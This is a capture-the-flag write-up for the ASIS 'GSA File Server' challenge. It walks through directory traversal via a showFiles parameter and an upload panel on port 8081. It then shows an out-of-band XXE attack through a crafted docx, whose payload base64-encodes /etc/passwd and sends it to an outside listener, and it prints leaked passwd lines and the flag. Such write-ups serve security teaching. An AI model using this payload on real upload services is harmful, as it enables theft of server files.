
<h1>GSA File Server</h1>  
<b>Category</b>: Web Network OSINT
<h2>Description:</h2>

GSA's file server, go find the hole, drill it and grab the flag :)
Note that Scope is 128.199.40.185:*
Alert: No remote brute force and automated scanning are needed.


So after checking the website, look like a simple web app with JS (js/functions.js) with a interesting parameter (showFiles)


![img](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/1.PNG)

so i tried  a GET request to see the server answer and all i get is this  (look like listing the elements in specefic current directory
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/2.PNG)

let check with burpsuit :
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/3.PNG)

Bingooo, as you can see in the server answer ther is the Directory parameter , so let's try some traversal things ,
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/4.PNG)

use ../  and you can see that it's work perfectly , let's check others files 

![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/5.PNG)


so the admin panel is the (panelmanager-0.1) , now we have to read the files on the server, but first let's check the the panelmanager
let's try 128.199.40.185/panelmanager-0.1 .. FAIL!!!
but as you can see in the description that said (that Scope is 128.199.40.185:*) 

you can check with nmap (becarfull with the scan tools) try the common port 8080 (FAIL) ..8081 (work)
is a simple upload that's allow you to upload files (docx ..)

![img](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/099.PNG)

generally when we say docx ==> XML ==> XXE , 
we need a listener and a good payload and docx (where we inject in the word/document.xml) 
i used https://requestb.in (as listener )  and as a payload in the docx 

![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/payload.PNG)

where the txt file contains:
```
<!ENTITY % filebase64 SYSTEM "php://filter/convert.base64-encode/resource=../../../../etc/passwd">
<!ENTITY % injme '<!ENTITY startme SYSTEM "https://requestb.in/****?xxe=%filebase64;">'>
```

so i have only to modify the payloads in my webserver and reupload the file docx (with it rebuild-it every single try)
and to check the aswer you have to visite (https://requestb.in/****?inspect) 

i get answer for the /etc/passwd  
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
[................]
```

to be honest i spent hours graping files but no FLAG ...  but the most interesting thing  is the  filesharing (permission denied) 
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/7.PNG)

so the idea is to read /etc/samba/smb.conf to get secret dir filename which is s3cRetP4th 
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/10.PNG)

and all we have to do now is the grab the file and get the FLAG  
![alt text](https://raw.githubusercontent.com/occupe/Writeups-CTF/master/ASIS-CTF/Gsa%20File%20server/images/11.PNG) 

the flag  ASIS{Vuln_web_appZ_plus_misc0nfig_eQ_dis4st3R!}  
